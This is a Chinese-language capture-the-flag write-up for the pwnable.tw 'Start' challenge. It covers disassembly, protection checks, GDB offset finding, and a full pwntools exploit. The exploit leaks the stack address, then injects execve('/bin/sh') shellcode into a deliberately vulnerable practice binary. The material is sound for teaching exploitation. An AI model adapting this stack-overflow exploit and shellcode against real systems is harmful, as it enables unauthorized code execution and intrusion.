网站：https://pwnable.tw/

Challenge：Start

#### 1、使用file查看文件信息

```bash
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

start，一个32位的elf文件，静态链接的，平台80386

#### 2、objdump反汇编

```bash
$ objdump -d -M intel start

start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	54                   	push   esp
 8048061:	68 9d 80 04 08       	push   0x804809d
 8048066:	31 c0                	xor    eax,eax
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx
 804806e:	68 43 54 46 3a       	push   0x3a465443
 8048073:	68 74 68 65 20       	push   0x20656874
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14
 804808b:	b3 01                	mov    bl,0x1
 804808d:	b0 04                	mov    al,0x4
 804808f:	cd 80                	int    0x80
 8048091:	31 db                	xor    ebx,ebx
 8048093:	b2 3c                	mov    dl,0x3c
 8048095:	b0 03                	mov    al,0x3
 8048097:	cd 80                	int    0x80
 8048099:	83 c4 14             	add    esp,0x14
 804809c:	c3                   	ret

0804809d <_exit>:
 804809d:	5c                   	pop    esp
 804809e:	31 c0                	xor    eax,eax
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80
```

可以看到start没有main函数，没有main函数，只有两个函数`_start`和`_exit`，并且没有调用其他库函数，而是使用`int 0x80`触发中断来使用系统调用实现的。可见这是一个由汇编写的程序。

#### 3、简单分析

**关键代码-1**：系统调用sys_write，和printf函数类似，将ecx的值打印到stdout中，打印的长度为0x14

```bash
 8048087:	89 e1                	mov    ecx,esp		# ecx->esp
 8048089:	b2 14                	mov    dl,0x14		# 输出的长度为 0x14
 804808b:	b3 01                	mov    bl,0x1			# 表示向stdout输出
 804808d:	b0 04                	mov    al,0x4			# 系统调用号，代表sys_write
 804808f:	cd 80                	int    0x80				# 中断，陷入内核执行系统调用
```

**关键代码-2**：系统调用sys_read，和gets函数类似，用于从stdout获取输入

```bash
 8048091:	31 db                	xor    ebx,ebx		# ebx为0，表示从stdout读
 8048093:	b2 3c                	mov    dl,0x3c		# dl代表长度为0x3c
 8048095:	b0 03                	mov    al,0x3			# 系统调用号，代表sys_read
 8048097:	cd 80                	int    0x80
```

#### 4、查看保护

```bash
$ checksec start
[*] '/root/workspace/pwnable/Start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

没有开启任何保护，程序加载到内存中的地址固定、栈中的数据可以直接执行、也没有开启canary

#### 5、执行程序进行简单测试

```bash
$ ./start
Let's start the CTF:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    2866 segmentation fault (core dumped)  ./start
```

很明显这是一个栈溢出

start这个程序没有其他可以用于存储shellcode的地方，只能将shellcode写入栈中，然后覆盖函数地址为栈中shellcode的地址。

所以关键点在于如何泄露栈的地址。

可以发现**关键代码-1**刚好可以用于泄漏esp的值。

#### 6、GDB调试

生成可以用来计算偏移量的字符串，长度一定要确保能覆盖到EIP

```bash
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
```

运行程序，并输入上面生成的字符串

```bash
gdb-peda$ r
Starting program: /root/workspace/pwnable/Start/start
Let's start the CTF:AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x33 ('3')
EBX: 0x0
ECX: 0xffffd5c4 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
EDX: 0x3c ('<')
ESI: 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xffffd5dc ("(AADAA;AA)AAEAAaAA0AAFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
EIP: 0x41412d41 ('A-AA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41412d41
[------------------------------------stack-------------------------------------]
0000| 0xffffd5dc ("(AADAA;AA)AAEAAaAA0AAFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
0004| 0xffffd5e0 ("AA;AA)AAEAAaAA0AAFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
0008| 0xffffd5e4 ("A)AAEAAaAA0AAFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
0012| 0xffffd5e8 ("EAAaAA0AAFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
0016| 0xffffd5ec ("AA0AAFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
0020| 0xffffd5f0 ("AFAAbA\n\377\221\327\377\377\233\327\377\377\250\327\377\377\263\327\377\377\033\330\377\377/\330\377\377>\330\377\377^\330\377\377\216\330\377\377\241\330\377\377\265\330\377\377\307\330\377\377\343\330\377\377\026\331\377\377\036\331\377\377@\331\377\377e\331\377\377z\331\377\377\205\331\377\377\215\331\377\377\255\331\377\377\231\337\377\377\277\337\377\377\310\337\377\377")
0024| 0xffffd5f4 --> 0xff0a4162
0028| 0xffffd5f8 --> 0xffffd791 ("USER=root")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41412d41 in ?? ()
```

可以看到程序报错了，并且EIP已经被'A-AA'覆盖，

计算偏移，编译为20，即0x14

```bash
gdb-peda$ pattern offset A-AA
A-AA found at offset: 20
```

#### 6、EXP

```python
# coding: utf-8
from pwn import *

context.os = 'linux'
context.arch = 'i386'

stack_leak = 0x08048087		# 可以用于泄漏esp的值

# print hex(u32('/sh\0'))
# print hex(u32('/bin'))

# i386用于执行shell的系统调用
shellcode = asm("""
    push 0x68732f
    push 0x6e69622f
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80
"""    
)

# r = process('./start')

r = remote('chall.pwnable.tw', 10000)
# raw_input()

log.info('Pwning start')
r.recvuntil('CTF:')

# leak esp value
payload1 = 'a' * 0x14 + p32(stack_leak)		# payload用于泄漏esp的值
# save esp value and print esp value
r.send(payload1)
stack_addr =  u32(r.recv(4))
log.info('Stack Address: {}'.format(hex(stack_addr)))

# add 0x14 and shellcode
payload2 = 'b' * 0x14
payload2 += p32(stack_addr + 0x14)
payload2 += shellcode

r.send(payload2)
r.interactive()

```

